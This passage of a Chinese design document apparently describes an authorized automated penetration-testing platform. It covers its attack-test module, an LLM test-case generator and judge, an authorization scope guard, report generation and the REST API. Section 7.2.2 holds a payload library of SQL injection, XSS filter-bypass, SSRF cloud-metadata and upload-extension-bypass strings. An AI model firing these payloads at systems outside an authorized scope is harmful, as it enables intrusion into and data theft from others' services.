
---

## 7. M5 自动渗透测试模块

### 7.1 模块概述

**职责**：基于接口特征，动态生成并执行靶向漏洞测试用例，输出经验证的漏洞记录。

**输入**：M4 输出的标准化接口特征库  
**输出**：漏洞验证报告（含证据、置信度、修复建议）

> **安全声明**：本模块所有测试必须通过 `BoundaryGuard` 授权边界校验，严禁对未授权资产执行测试。

### 7.2 接口分类与漏洞规则映射

#### 7.2.1 完整规则映射表

| 接口类型 | 漏洞类型 | 测试策略 | 优先级 |
|---------|---------|---------|-------|
| 操作类（operation） | 水平越权 | 替换 userId/目标ID，用当前 Token 访问他人资源 | P0 |
| 操作类（operation） | 垂直越权 | 替换 roleId/权限级别，低权限账号调用高权限操作 | P0 |
| 查询类（query） | 未授权访问 | 移除 Authorization 头，检查是否返回业务数据 | P0 |
| 搜索类（search） | SQL 注入 | 注入经典 Payload（报错型/盲注型/联合查询型） | P0 |
| 搜索类（search） | XSS | 注入 HTML/JS Payload，检查响应是否原样返回 | P1 |
| 文件处理类（upload） | 恶意文件上传 | 上传含脚本的文件（绕过扩展名检查） | P0 |
| 文件处理类（upload） | 路径穿越 | 文件名含 `../`，检查是否写入任意路径 | P1 |
| 管理员类（admin） | 未授权访问 | 普通用户 Token 调用管理接口 | P0 |
| 认证类（auth） | 弱口令/枚举 | 账号枚举（响应差异）、密码暴力（频率限制检测） | P1 |
| 配置类（config） | 敏感信息泄露 | 检查响应是否含密钥/密码/内部 IP | P1 |
| 任意类 | SSRF | 参数含 URL/IP/域名时，注入内网地址 | P1 |
| 任意类 | IDOR | 基于对象引用的直接访问（序列化 ID 遍历） | P0 |

#### 7.2.2 漏洞 Payload 库设计

```python
class PayloadLibrary:
    """结构化 Payload 库，按漏洞类型分类管理"""
    
    # SQL 注入 Payload
    SQLI_PAYLOADS = {
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(0)--",    # 基准响应时间
        ],
        "time_blind": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
            "' AND pg_sleep(5)--",          # PostgreSQL
        ],
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' ORDER BY 1--",
        ],
    }
    
    # XSS Payload（覆盖常见过滤绕过场景）
    XSS_PAYLOADS = {
        "basic": [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ],
        "bypass_filter": [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script>alert`1`</script>',
            "javascript:alert(1)",
            '<iframe srcdoc="<script>alert(1)</script>">',
        ],
        "dom_based": [
            '#<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
        ],
    }
    
    # SSRF Payload
    SSRF_PAYLOADS = {
        "internal_net": [
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
            "http://metadata.google.internal/",           # GCP
            "http://100.100.100.200/latest/meta-data/",   # 阿里云
            "http://192.168.1.1",
        ],
        "bypass": [
            "http://2130706433",       # 127.0.0.1 十进制
            "http://0x7f000001",       # 127.0.0.1 十六进制
            "http://127.0.1",          # 简写
        ],
    }
    
    # 文件上传绕过
    UPLOAD_PAYLOADS = {
        "extension_bypass": {
            ".php":  [".php5", ".phtml", ".pHp", ".php.jpg", ".php%00.jpg"],
            ".jsp":  [".jsp_", ".jspx", ".jspa"],
            ".aspx": [".aspx_", ".asmx"],
        },
        "content_type_bypass": {
            "image/jpeg": "恶意 PHP 文件伪装成图片",
        },
        "magic_bytes": {
            "jpg_header": b"\xff\xd8\xff\xe0",  # 文件头伪造
        },
    }
```

### 7.3 测试用例生成 Agent

```python
class TestCaseGenerator:
    
    GENERATION_PROMPT = """
你是渗透测试专家，根据接口特征生成精准测试用例。
严格限制：只生成已授权资产的测试用例。

接口信息：
  路径: {path}
  方法: {method}
  类型: {api_type}
  参数列表: {parameters}
  认证头: {auth_header}
  触发场景: {trigger}
  敏感参数: {sensitive_params}

漏洞类型：{vuln_type}
可用 Payload: {available_payloads}

生成 3~5 个测试用例，每个包含：
{
  "case_id": "唯一标识",
  "vuln_type": "漏洞类型",
  "description": "测试说明（中文，50字以内）",
  "modified_request": {
    "method": "GET/POST",
    "path": "修改后的路径",
    "headers": {"Authorization": "..."},
    "params": {"参数名": "Payload值"},
    "body": {}
  },
  "expected_vuln_indicator": "触发漏洞时的响应特征（关键词/状态码/时延）",
  "false_positive_risk": "HIGH|MED|LOW",
  "priority": 1~10
}
"""
    
    async def generate_for_interface(
        self,
        interface: ApiInterface,
        vuln_types: list[str]
    ) -> list[TestCase]:
        
        # 优先处理高优先级接口
        cases = []
        for vuln_type in vuln_types:
            payloads = payload_library.get_payloads(vuln_type)
            
            response = await llm.ainvoke(
                self.GENERATION_PROMPT.format(
                    path=interface.path,
                    method=interface.method,
                    api_type=interface.api_type,
                    parameters=interface.parameters,
                    auth_header=interface.request_headers.get("Authorization"),
                    trigger=interface.trigger_scenario,
                    sensitive_params=interface.sensitive_params,
                    vuln_type=vuln_type,
                    available_payloads=payloads[:10],  # 限制 Payload 数量
                )
            )
            cases.extend(self._parse_cases(response))
        
        # 按优先级排序
        return sorted(cases, key=lambda x: x.priority, reverse=True)
```

### 7.4 测试执行引擎

```python
class TestExecutor:
    
    EXECUTION_CONFIG = {
        "timeout_per_case":   30,    # 单个用例超时（秒）
        "delay_between_cases":1.5,   # 用例间隔（秒，避免触发限流）
        "max_concurrent":     3,     # 最大并发测试数
        "retry_on_timeout":   False, # 超时不重试（避免 DoS）
    }
    
    async def execute(
        self,
        test_case: TestCase,
        session: aiohttp.ClientSession
    ) -> TestResult:
        
        # 授权边界检查（必须通过才执行）
        if not await boundary_guard.check(test_case.target_asset_id):
            raise UnauthorizedTestError(
                f"Asset {test_case.target_asset_id} not in authorized scope"
            )
        
        start_time = time.time()
        
        try:
            response = await asyncio.wait_for(
                session.request(
                    method=test_case.modified_request.method,
                    url=test_case.modified_request.url,
                    headers=test_case.modified_request.headers,
                    params=test_case.modified_request.params,
                    json=test_case.modified_request.body,
                ),
                timeout=self.EXECUTION_CONFIG["timeout_per_case"]
            )
            
            return TestResult(
                case_id=test_case.case_id,
                status_code=response.status,
                response_body=await response.text(),
                response_time=time.time() - start_time,
                response_headers=dict(response.headers),
            )
            
        except asyncio.TimeoutError:
            # 对时间盲注的特殊处理：超时本身可能是漏洞证据
            elapsed = time.time() - start_time
            if test_case.vuln_type in ["time_blind_sqli", "ssrf"] and elapsed > 4.5:
                return TestResult(
                    case_id=test_case.case_id,
                    status_code=0,
                    response_body="[TIMEOUT - Possible vulnerability]",
                    response_time=elapsed,
                    timeout_triggered=True,
                )
            raise
```

### 7.5 LLM-as-Judge 漏洞验证

```python
class LLMVulnJudge:
    """
    使用 GPT-4o 对测试结果进行二次验证，降低误报率
    """
    
    JUDGE_PROMPT = """
你是资深安全研究员，判断以下测试结果是否为真实漏洞。
注意：高置信度判断需要有明确的漏洞证据，不能仅凭状态码。

漏洞类型: {vuln_type}
测试用例: {test_case_description}

原始请求:
  {request}

服务器响应:
  状态码: {status_code}
  响应时间: {response_time}ms
  响应头: {response_headers}
  响应体（前1000字符）: {response_body}

判断标准（严格执行）:
  SQL注入: 响应含DB错误信息 OR 延迟>4.5s OR 联合查询返回额外字段
  越权: 响应200且含其他用户的姓名/手机/身份证等PII数据
  未授权访问: 无Token请求返回200且响应含实际业务数据（非空/非错误）
  XSS: 响应将Payload原样输出到HTML/JSON中
  SSRF: 响应含内网IP/云服务元数据/内网服务特征
  文件上传: 上传成功且文件可通过URL访问

输出JSON:
{
  "is_confirmed_vuln": true/false,
  "confidence": 0.0~1.0,
  "evidence": "关键证据（直接引用响应中的关键字符串）",
  "vuln_severity": "critical|high|medium|low",
  "cvss_score": 0.0~10.0,
  "false_positive_risk": "HIGH|MED|LOW",
  "false_positive_reason": "如果误报风险高，说明原因",
  "remediation": "修复建议（3句话以内）"
}
"""
    
    async def judge(
        self,
        test_case: TestCase,
        test_result: TestResult
    ) -> VulnJudgment:
        
        # 预过滤：明显非漏洞的快速排除（节省 Token）
        if self._is_obvious_false_positive(test_case, test_result):
            return VulnJudgment(
                is_confirmed_vuln=False,
                confidence=0.05,
                evidence="服务器返回明确的拒绝响应",
                false_positive_risk="LOW"
            )
        
        response = await gpt4o.ainvoke(
            self.JUDGE_PROMPT.format(
                vuln_type=test_case.vuln_type,
                test_case_description=test_case.description,
                request=test_case.modified_request.to_curl(),
                status_code=test_result.status_code,
                response_time=int(test_result.response_time * 1000),
                response_headers=test_result.response_headers,
                response_body=test_result.response_body[:1000],
            )
        )
        
        return VulnJudgment(**json.loads(response.content))
    
    def _is_obvious_false_positive(
        self,
        test_case: TestCase,
        result: TestResult
    ) -> bool:
        """快速预过滤，避免浪费 LLM 调用"""
        # 状态码 401/403 + 无越权操作 → 直接排除
        if result.status_code in [401, 403, 404]:
            if test_case.vuln_type not in ["unauthorized_access"]:
                return True
        
        # 响应体为空 → 排除（除了盲注和 SSRF）
        if not result.response_body and test_case.vuln_type not in [
            "time_blind_sqli", "ssrf"
        ]:
            return True
        
        return False
```

### 7.6 授权边界守卫

```python
class BoundaryGuard:
    """
    强制执行的授权边界校验层
    所有渗透测试请求必须通过此校验
    """
    
    async def check(self, asset_id: str) -> bool:
        """检查资产是否在已授权测试范围内"""
        task = await get_task_by_asset(asset_id)
        authorized_scope = task.authorized_scope
        
        asset = await get_asset(asset_id)
        
        # 域名白名单检查
        if asset.domain:
            if not any(
                asset.domain.endswith(scope_domain)
                for scope_domain in authorized_scope.get("domains", [])
            ):
                await self._log_boundary_violation(asset_id, "domain_not_in_scope")
                return False
        
        # IP 范围检查
        if asset.ip_address:
            if not any(
                ip_address(asset.ip_address) in ip_network(scope_range)
                for scope_range in authorized_scope.get("ip_ranges", [])
            ):
                await self._log_boundary_violation(asset_id, "ip_not_in_scope")
                return False
        
        return True
    
    async def _log_boundary_violation(
        self, asset_id: str, reason: str
    ):
        """记录越界尝试（审计日志，不可删除）"""
        await audit_log.write({
            "event":    "boundary_violation_attempt",
            "asset_id": asset_id,
            "reason":   reason,
            "timestamp":datetime.utcnow().isoformat(),
        })
```

---

## 8. M6 报告生成模块

### 8.1 模块概述

**职责**：整合全流程探测结果，通过 LLM 生成结构化专业报告，并进行质量评分。

**输入**：M3 资产清单 + M4 接口清单 + M5 漏洞记录  
**输出**：Markdown 报告 + PDF 报告 + 质量评分报告

### 8.2 报告结构设计

```markdown
# 攻击面探测报告

## 执行摘要
- 测试时间范围、靶标企业概况
- 风险等级分布（饼图）
- 核心发现高亮（TOP 3 高危漏洞）
- 总体安全态势评估

## 靶标资产清单
- 资产总数、分类统计
- 各资产技术栈、端口、服务列表
- WAF/安全设备覆盖情况

## 接口特征清单
- 接口总数、类型分布
- 高风险接口列表（权限敏感接口）
- 接口认证覆盖率分析

## 漏洞详情
### [CRITICAL] 漏洞标题
- **位置**：具体接口路径
- **类型**：漏洞类型
- **CVSS评分**：X.X (分级说明)
- **验证证据**：截图/响应体片段
- **利用建议**：攻击者可如何利用
- **修复方案**：具体修复步骤

## 防护建议
- 按优先级排序的整体加固建议
- 技术栈特定的安全配置建议
- 应急处置优先级排序

## 附录
- 完整资产列表
- 测试用例明细
- 工具版本信息
```

### 8.3 报告生成 Agent

```python
class ReportGenerator:
    
    SECTION_PROMPTS = {
        "executive_summary": """
基于以下数据，生成攻击面探测报告的执行摘要（500字以内）。
语言简洁，适合非技术管理层阅读。

资产统计: {asset_stats}
漏洞统计: {vuln_stats}
高危漏洞: {critical_vulns}

输出要求：
1. 总体安全态势评级（高危/中危/低危）
2. 最严重的3个风险点（一句话描述）
3. 立即需要处理的事项（优先级排序）
""",
        
        "vuln_detail": """
为以下漏洞生成专业的漏洞详情描述（300字以内）。
面向安全工程师，技术性强，描述精准。

漏洞数据: {vuln_data}
测试证据: {evidence}

输出要求：
1. 漏洞原理（一句话）
2. 危害分析（具体的业务影响）
3. 复现步骤（3步以内）
4. 修复方案（具体代码级建议，如有可能）
""",
        
        "remediation_summary": """
基于以下漏洞列表，生成整体防护建议。
按优先级排序，考虑修复成本和风险降低效果。

漏洞列表: {vuln_list}
技术栈: {tech_stack}

输出格式：
P0（立即处理）: 最多3条
P1（本周处理）: 最多5条
P2（本月处理）: 若干条
"""
    }
    
    async def generate_full_report(
        self,
        task_id: str
    ) -> Report:
        """并行生成各个章节，合并成完整报告"""
        
        # 准备数据
        data = await self._prepare_report_data(task_id)
        
        # 并行生成各章节
        sections = await asyncio.gather(
            self._gen_executive_summary(data),
            self._gen_asset_section(data),
            self._gen_interface_section(data),
            self._gen_vuln_details(data),
            self._gen_remediation(data),
        )
        
        # 质量评分
        quality_score = await self.quality_scorer.score(sections)
        
        # 合并并导出
        report = self._merge_sections(sections)
        await self._export_markdown(report, task_id)
        await self._export_pdf(report, task_id)
        
        return Report(
            content=report,
            quality_score=quality_score,
            generated_at=datetime.utcnow(),
        )
```

### 8.4 LLM-as-Judge 报告质量评分

```python
class ReportQualityScorer:
    
    SCORING_DIMENSIONS = {
        "accuracy":    ("准确性", 0.35, "漏洞描述与证据是否一致"),
        "completeness":("完整性", 0.30, "是否覆盖所有发现的漏洞"),
        "readability": ("可读性", 0.20, "描述是否清晰，逻辑是否连贯"),
        "actionability":("可行性",0.15, "修复建议是否具体可操作"),
    }
    
    async def score(self, report: str, raw_data: dict) -> QualityScore:
        """
        评分逻辑：
        1. 验证报告中每个漏洞描述与原始测试数据的一致性（准确性）
        2. 检查原始漏洞数 vs 报告中漏洞数（完整性）
        3. LLM 评估语言清晰度和逻辑结构（可读性）
        4. LLM 评估修复建议的可操作性（可行性）
        """
```

---

## 9. API 设计规范

### 9.1 总体规范

**基础 URL**：`https://api.attackscope.example.com/v1`  
**认证方式**：Bearer Token（JWT，24h 过期）  
**内容类型**：`application/json`  
**字符编码**：UTF-8  
**时间格式**：ISO 8601（`2024-01-01T00:00:00Z`）  

**错误响应格式**：
```json
{
  "error": {
    "code":    "TASK_NOT_FOUND",
    "message": "任务 ID xxx 不存在",
    "details": {},
    "request_id": "req_abc123",
    "timestamp": "2024-01-01T00:00:00Z"
  }
}
```

**分页格式**：
```json
{
  "data":  [],
  "pagination": {
    "page":       1,
    "page_size":  20,
    "total":      247,
    "total_pages":13
  }
}
```

### 9.2 任务管理 API

#### 创建探测任务

```
POST /v1/tasks
```

**请求体**：
```json
{
  "company_name":      "XX支付科技有限公司",
  "company_aliases":   ["XX支付", "XX Pay"],
  "industry":          "fintech",
  "authorized_scope": {
    "domains":   ["xx-payment.com", "xx-pay.cn"],
    "ip_ranges": ["203.x.x.0/24"],
    "exclude":   ["mail.xx-payment.com"]
  },
  "config": {
    "keyword_types":     ["business", "tech", "entity"],
    "asset_platforms":   ["fofa", "hunter"],
    "crawl_depth":       2,
    "pentest_enabled":   true,
    "pentest_intensity": "normal",
    "notification_webhook": "https://hook.example.com/xxx"
  }
}
```

**响应 201**：
```json
{
  "task_id":    "task_01J9XXXXX",
  "status":     "pending",
  "created_at": "2024-01-01T08:00:00Z",
  "estimated_duration_hours": 8,
  "stages": [
    {"stage": "intelligence",    "status": "pending"},
    {"stage": "keyword_gen",     "status": "pending"},
    {"stage": "asset_discovery", "status": "pending"},
    {"stage": "api_crawl",       "status": "pending"},
    {"stage": "pentest",         "status": "pending"},
    {"stage": "report_gen",      "status": "pending"}
  ]
}
```

#### 获取任务详情

```
GET /v1/tasks/{task_id}
```

**响应 200**：
```json
{
  "task_id":       "task_01J9XXXXX",
  "company_name":  "XX支付科技有限公司",
  "status":        "running",
  "current_stage": "api_crawl",
  "progress":      0.68,
  "stats": {
    "assets_found":       247,
    "assets_confirmed":   189,
    "interfaces_crawled": 1832,
    "vulns_detected":     43,
    "vulns_confirmed":    31
  },
  "stage_details": {
    "intelligence":    {"status": "completed", "duration_s": 180, "items": 1250},
    "keyword_gen":     {"status": "completed", "keywords": 113},
    "asset_discovery": {"status": "completed", "assets": 247, "confirmed": 189},
    "api_crawl":       {"status": "running",   "progress": 0.76, "interfaces": 1832},
    "pentest":         {"status": "pending"},
    "report_gen":      {"status": "pending"}
  },
  "created_at":   "2024-01-01T08:00:00Z",
  "started_at":   "2024-01-01T08:01:00Z",
  "estimated_completion": "2024-01-01T16:00:00Z"
}
```

#### 任务操作

```
POST /v1/tasks/{task_id}/pause      # 暂停
POST /v1/tasks/{task_id}/resume     # 恢复
POST /v1/tasks/{task_id}/cancel     # 取消
POST /v1/tasks/{task_id}/retry      # 重试失败阶段
```

#### 列出任务

```
GET /v1/tasks?status=running&page=1&page_size=20
```

#### 任务实时状态（WebSocket）

```
WS /v1/tasks/{task_id}/events
```

**推送事件格式**：
```json
{
  "event_type": "stage_progress | agent_log | vuln_found | task_complete | error",
  "timestamp":  "2024-01-01T08:30:00Z",
  "data": {
    "stage":    "api_crawl",
    "progress": 0.45,
    "message":  "已爬取 824/1832 个接口",
    "agent":    "APICRAWL-BROWSER"
  }
}
```

### 9.3 关键词 API

#### 获取任务关键词

```
GET /v1/tasks/{task_id}/keywords?type=business&min_weight=0.5
```

**响应 200**：
```json
{
  "data": [
    {
      "id":         "kw_xxx",
      "word":       "第三方支付",
      "type":       "business",
      "weight":     0.92,
      "confidence": 0.96,
      "source":     "新闻报道:36氪",
      "derived":    false,
      "used_in_dsl":true
    }
  ],
  "summary": {
    "business_count": 46,
    "tech_count":     29,
    "entity_count":   38,
    "total":          113
  },
  "pagination": {"page":1,"page_size":20,"total":113,"total_pages":6}
}
```

#### 手动添加关键词

```
POST /v1/tasks/{task_id}/keywords
```

```json
{
  "word":  "XX科技金融",
  "type":  "business",
  "weight": 0.85,
  "reason": "人工补充：企业子品牌"
}
```

#### 删除关键词

```
DELETE /v1/tasks/{task_id}/keywords/{keyword_id}
```

### 9.4 资产 API

#### 获取资产列表

```
GET /v1/tasks/{task_id}/assets?risk=high&confirmed=true&page=1&page_size=20
```

**查询参数**：

| 参数 | 类型 | 说明 |
|-----|------|-----|
| `risk` | string | `critical\|high\|medium\|low\|info` |
| `confirmed` | boolean | 是否已确认为靶标 |
| `asset_type` | string | `web\|api\|mobile\|infra` |
| `icp_verified` | boolean | ICP 备案是否验证 |
| `has_waf` | boolean | 是否有 WAF |
| `tech_stack` | string | 技术栈过滤（如 `spring`) |

**响应 200**：
```json
{
  "data": [{
    "id":             "asset_xxx",
    "domain":         "api.xx-payment.com",
    "ip_address":     "203.x.x.45",
    "asset_type":     "api",
    "confidence":     0.96,
    "risk_level":     "high",
    "icp_verified":   true,
    "waf_detected":   "Cloudflare",
    "tech_stack":     ["Spring Boot 2.7", "Nginx 1.24", "Redis"],
    "open_ports":     [80, 443, 8080],
    "cert_info": {
      "subject":      "api.xx-payment.com",
      "issuer":       "Let's Encrypt",
      "expires_at":   "2024-06-01"
    },
    "vuln_count": {
      "critical": 1, "high": 3, "medium": 5, "low": 2
    },
    "interface_count": 89,
    "discovered_at":  "2024-01-01T09:00:00Z"
  }],
  "pagination": {}
}
```

#### 获取资产详情

```
GET /v1/tasks/{task_id}/assets/{asset_id}
```

#### 更新资产状态

```
PATCH /v1/tasks/{task_id}/assets/{asset_id}
```

```json
{
  "confirmed":   true,
  "risk_level":  "critical",
  "notes":       "已确认为核心支付网关，高优先级"
}
```

#### 资产导出

```
GET /v1/tasks/{task_id}/assets/export?format=csv|xlsx|json
```

### 9.5 接口特征 API

#### 获取接口列表

```
GET /v1/tasks/{task_id}/interfaces?asset_id=xxx&type=operation&privilege_sensitive=true
```

**查询参数**：

| 参数 | 类型 | 说明 |
|-----|------|-----|
| `asset_id` | string | 过滤特定资产 |
| `type` | string | 接口类型过滤 |
| `privilege_sensitive` | boolean | 是否为权限敏感接口 |
| `auth_required` | boolean | 是否需要认证 |
| `min_priority` | integer | 最低测试优先级（1-10） |
| `method` | string | HTTP 方法过滤 |

**响应 200**：
```json
{
  "data": [{
    "id":                "iface_xxx",
    "asset_id":          "asset_xxx",
    "path":              "/api/v2/user/{userId}/orders",
    "method":            "GET",
    "api_type":          "query",
    "parameters": [{
      "name":            "userId",
      "location":        "path",
      "type":            "integer",
      "required":        true,
      "sensitive":       true
    }],
    "auth_required":     true,
    "privilege_sensitive":true,
    "sensitive_params":  ["userId"],
    "trigger_scenario":  "点击订单列表",
    "test_priority":     9,
    "crawl_method":      "dynamic",
    "vuln_tested":       true,
    "vuln_count":        2,
    "version":           1,
    "crawled_at":        "2024-01-01T10:00:00Z"
  }],
  "summary": {
    "total": 1832,
    "by_type": {"query":891,"operation":347,"upload":45,"search":120,"auth":89,"admin":67,"other":273},
    "privilege_sensitive": 312,
    "untested": 428
  },
  "pagination": {}
}
```

#### 获取接口详情

```
GET /v1/tasks/{task_id}/interfaces/{interface_id}
```

#### 手动标记接口

```
PATCH /v1/tasks/{task_id}/interfaces/{interface_id}
```

```json
{
  "test_priority": 10,
  "notes":         "疑似批量导出接口，高越权风险",
  "skip_test":     false
}
```

### 9.6 漏洞 API

#### 获取漏洞列表

```
GET /v1/tasks/{task_id}/vulnerabilities?severity=critical&confirmed=true
```

**查询参数**：

| 参数 | 类型 | 说明 |
|-----|------|-----|
| `severity` | string | `critical\|high\|medium\|low\|info` |
| `vuln_type` | string | 漏洞类型 |
| `confirmed` | boolean | 是否经 LLM-as-Judge 确认 |
| `false_positive_risk` | string | 误报风险等级 |
| `asset_id` | string | 特定资产的漏洞 |

**响应 200**：
```json
{
  "data": [{
    "id":              "vuln_xxx",
    "asset_id":        "asset_xxx",
    "interface_id":    "iface_xxx",
    "vuln_type":       "PRIVILEGE_ESCALATION",
    "severity":        "high",
    "cvss_score":      8.1,
    "title":           "订单查询接口存在水平越权",
    "description":     "攻击者可通过修改 userId 参数查看任意用户的订单信息",
    "affected_path":   "GET /api/v2/user/{userId}/orders",
    "test_payload":    "将 userId=1001 替换为 userId=9999",
    "evidence": {
      "request":       "GET /api/v2/user/9999/orders HTTP/1.1\nAuthorization: Bearer eyJ...(userId=1001的Token)",
      "response_code": 200,
      "response_snippet": "{\"data\":[{\"orderId\":\"2024xxxx\",\"userId\":9999,\"amount\":5000,...}]}"
    },
    "llm_confidence":  0.97,
    "false_positive_risk": "LOW",
    "remediation":     "服务端验证当前登录用户ID与请求参数userId是否一致，不一致时返回403",
    "status":          "confirmed",
    "confirmed_at":    null,
    "discovered_at":   "2024-01-01T14:00:00Z"
  }],
  "summary": {
    "total": 43,
    "by_severity": {"critical":5,"high":12,"medium":18,"low":8},
    "confirmed": 31,
    "false_positive_risk": {"HIGH":3,"MED":6,"LOW":34}
  },
  "pagination": {}
}
```

#### 获取漏洞详情

```
GET /v1/tasks/{task_id}/vulnerabilities/{vuln_id}
```

#### 更新漏洞状态

```
PATCH /v1/tasks/{task_id}/vulnerabilities/{vuln_id}
```

```json
{
  "status":         "confirmed|false_positive|fixed|wont_fix",
  "human_confirmed": true,
  "notes":          "已复现，确认为真实漏洞",
  "confirmed_by":   "security_engineer_01"
}
```

#### 漏洞统计

```
GET /v1/tasks/{task_id}/vulnerabilities/statistics
```

**响应 200**：
```json
{
  "by_severity":    {"critical":5,"high":12,"medium":18,"low":8},
  "by_type":        {"PRIVILEGE_ESC":8,"SQL_INJECTION":5,"UNAUTHORIZED":12,"XSS":6,"OTHER":12},
  "by_asset": [{
    "asset_id":     "asset_xxx",
    "domain":       "api.xx-payment.com",
    "vuln_count":   15,
    "max_severity": "critical"
  }],
  "trend":          [],
  "risk_score":     8.3,
  "confirmed_rate": 0.72
}
```

### 9.7 报告 API

#### 触发报告生成

```
POST /v1/tasks/{task_id}/reports
```

```json
{
  "format":     ["markdown", "pdf"],
  "sections":   ["summary", "assets", "interfaces", "vulns", "remediation"],
  "language":   "zh-CN",
  "template":   "standard|detailed|executive"
}
```

**响应 202**：
```json
{
  "report_job_id": "rjob_xxx",
  "status":        "generating",
  "estimated_minutes": 15
}
```

#### 获取报告状态

```
GET /v1/tasks/{task_id}/reports/{report_id}
```

**响应 200**：
```json
{
  "report_id":     "report_xxx",
  "status":        "completed",
  "quality_score": {
    "overall":      0.93,
    "accuracy":     0.96,
    "completeness": 0.91,
    "readability":  0.94,
    "actionability":0.89
  },
  "files": {
    "markdown": "https://storage.example.com/reports/xxx.md",
    "pdf":      "https://storage.example.com/reports/xxx.pdf"
  },
  "page_count":     47,
  "word_count":     8234,
  "generated_at":  "2024-01-01T16:00:00Z",
  "generation_duration_minutes": 18
}
```

#### 下载报告

```
GET /v1/tasks/{task_id}/reports/{report_id}/download?format=pdf
```

### 9.8 系统 API

#### 健康检查

```
GET /v1/health
```

```json
{
  "status":     "healthy",
  "version":    "v2.0.0",
  "timestamp":  "2024-01-01T00:00:00Z",
  "components": {
    "database":     {"status":"healthy","latency_ms":2},
    "redis":        {"status":"healthy","latency_ms":1},
    "qdrant":       {"status":"healthy","latency_ms":5},
    "kafka":        {"status":"healthy","lag":0},
    "llm_qwen":     {"status":"healthy","latency_ms":145},
    "llm_gpt4o":    {"status":"healthy","latency_ms":890},
    "playwright":   {"status":"healthy","pool_size":5}
  }
}
```

#### 系统指标

```
GET /v1/metrics
```

```json
{
  "active_tasks":          3,
  "queued_tasks":          7,
  "completed_tasks_today": 12,
  "avg_task_duration_h":   6.2,
  "llm_calls_today":       4821,
  "llm_cost_usd_today":    12.47,
  "assets_discovered_today": 1832,
  "vulns_confirmed_today":   127,
  "api_requests_per_min":    342
}
```

#### Agent 配置管理

```
GET  /v1/config/agents                    # 获取所有 Agent 配置
GET  /v1/config/agents/{agent_name}       # 获取单个 Agent 配置
PUT  /v1/config/agents/{agent_name}       # 更新 Agent 配置
POST /v1/config/agents/{agent_name}/test  # 测试 Agent 可用性
```

**更新 Agent 配置示例**：
```json
{
  "model":           "qwen2.5-7b",
  "temperature":     0.1,
  "max_tokens":      2048,
  "timeout_s":       30,
  "retry_attempts":  3,
  "enabled":         true
}
```

#### Webhook 通知

```
POST /v1/config/webhooks
```

```json
{
  "url":    "https://your-service.example.com/webhook",
  "events": ["task.complete", "vuln.critical_found", "task.failed"],
  "secret": "hmac_secret_for_verification"
}
```

**Webhook 推送格式**：
```json
{
  "event":      "vuln.critical_found",
  "task_id":    "task_xxx",
  "timestamp":  "2024-01-01T14:00:00Z",
  "data": {
    "vuln_id":  "vuln_xxx",
    "severity": "critical",
    "title":    "核心支付接口存在SQL注入",
    "asset":    "api.xx-payment.com"
  },
  "signature":  "sha256=xxxx"
}
```
